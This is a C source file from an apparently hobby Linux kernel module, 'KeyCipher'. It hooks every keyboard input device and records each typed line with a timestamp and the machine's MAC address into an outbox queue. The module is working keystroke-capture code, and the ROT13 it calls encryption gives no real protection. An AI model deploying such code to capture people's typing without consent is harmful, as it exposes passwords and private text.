#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/ktime.h>
#include <linux/netdevice.h>
#include <linux/etherdevice.h>
#include <net/net_namespace.h>
#include "input_intercept.h"
#include "fifo_buffer.h"
#include "keycipher.h"
#include "cipher.h"
#include "typing_stack.h"


static struct typing_stack current_stack;

// Uses the linux network header files and prebuilt functions to get the MAC address of the machine.
static void get_author_mac(char *buf, size_t buf_len)
{
    struct net_device *dev;

    if (!buf || buf_len == 0)
        return;

    dev = dev_get_by_name(&init_net, "eth0");
    if (!dev)
        dev = dev_get_by_name(&init_net, "wlan0");
    if (dev && is_valid_ether_addr(dev->dev_addr)) {
        snprintf(buf, buf_len, "%pM", dev->dev_addr);
        dev_put(dev);
    } else {
        if (dev)
            dev_put(dev);
        snprintf(buf, buf_len, "unknown");
    }
}

//Linux Keycode to ASCII value
static const char keycode_to_ascii[256] = {
    [KEY_A]='a',[KEY_B]='b',[KEY_C]='c',[KEY_D]='d',
    [KEY_E]='e',[KEY_F]='f',[KEY_G]='g',[KEY_H]='h',
    [KEY_I]='i',[KEY_J]='j',[KEY_K]='k',[KEY_L]='l',
    [KEY_M]='m',[KEY_N]='n',[KEY_O]='o',[KEY_P]='p',
    [KEY_Q]='q',[KEY_R]='r',[KEY_S]='s',[KEY_T]='t',
    [KEY_U]='u',[KEY_V]='v',[KEY_W]='w',[KEY_X]='x',
    [KEY_Y]='y',[KEY_Z]='z',
    [KEY_0]='0',[KEY_1]='1',[KEY_2]='2',[KEY_3]='3',
    [KEY_4]='4',[KEY_5]='5',[KEY_6]='6',[KEY_7]='7',
    [KEY_8]='8',[KEY_9]='9',
    [KEY_SPACE]=' ',[KEY_ENTER]='\n',[KEY_DOT]='.',
    [KEY_COMMA]=',',[KEY_MINUS]='-',
};


static void input_event_handler(struct input_handle *handle, unsigned int type, unsigned int code, int value)
{
    char ch;

    if (type != EV_KEY) return;
    if (value != 1) return; // key-press only, ignore release and repeat 

    if (code == KEY_BACKSPACE) {
        typing_stack_pop(&current_stack, &ch); 
        return;
    }

    if (code == KEY_ENTER) {
        struct keycipher_message msg;
        int len = typing_stack_size(&current_stack);

        memset(&msg, 0, sizeof(msg));
        ktime_get_real_ts64(&msg.timestamp);
        get_author_mac(msg.author, sizeof(msg.author));
        memcpy(msg.data, current_stack.data, len);
        msg.len = len;

        fifo_write(&outbox_fifo, &msg);
        typing_stack_clear(&current_stack);
        printk(KERN_DEBUG "KeyCipher: message committed (%d chars)\n", len);
        return;
    }

    // Regular key: look up ASCII, encrypt, push onto stack 
    if (code >= ARRAY_SIZE(keycode_to_ascii)) return;
    ch = keycode_to_ascii[code];
    if (ch == 0) return;

    rot13_encrypt(&ch, 1);
    typing_stack_push(&current_stack, ch);
    printk(KERN_DEBUG "KeyCipher: pushed encrypted char\n");
}

static int input_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id)
{
    //Allocate memory on heap so handle outlives input_connect
    struct input_handle *handle = kzalloc(sizeof(*handle), GFP_KERNEL);
    int ret;
    if (!handle) {
        return -ENOMEM;
    }

    handle->private = NULL;
    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keycipher";

    ret = input_register_handle(handle);
    if (ret) {
        kfree(handle);
        return ret;
    }

    ret = input_open_device(handle);
    if (ret) {
        input_unregister_handle(handle);
        kfree(handle);
        return ret;
    }

    printk(KERN_INFO "KeyCipher: Device connected - %s\n", dev->name);
    return 0;
}

 static void input_disconnect(struct input_handle *handle)
 {
     const char *name = handle->dev->name;  
     input_close_device(handle);
     input_unregister_handle(handle);
     kfree(handle);
     printk(KERN_INFO "KeyCipher: Device disconnected - %s\n", name);
 }

static const struct input_device_id key_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { }, // sentinel or flag required to terminate the table this indicates the end of the table 
};


static struct input_handler keycipher_input_handler = {
    .event      = input_event_handler,
    .connect    = input_connect,
    .disconnect = input_disconnect,
    .name       = "keycipher",
    .id_table   = key_ids,
};


int input_intercept_init(void)
{
    int ret;

    typing_stack_init(&current_stack);

    ret = input_register_handler(&keycipher_input_handler);
    if (ret < 0) {
        printk(KERN_ERR "KeyCipher: failed to register input handler.\n Error code: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "KeyCipher: input handler registered\n");
    return 0;
}


void input_intercept_exit(void)
{
    input_unregister_handler(&keycipher_input_handler);
    printk(KERN_INFO "KeyCipher: Input handler unregistered");
    
}